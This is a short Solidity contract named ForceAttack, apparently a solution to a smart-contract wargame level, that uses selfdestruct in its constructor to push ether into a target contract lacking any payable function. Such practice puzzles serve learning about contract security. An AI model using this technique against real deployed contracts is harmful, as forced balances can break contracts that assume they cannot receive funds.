// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./force.sol";

contract ForceAttack {

    address force;

    constructor (address payable _force) payable {
        selfdestruct(_force);
    } 

}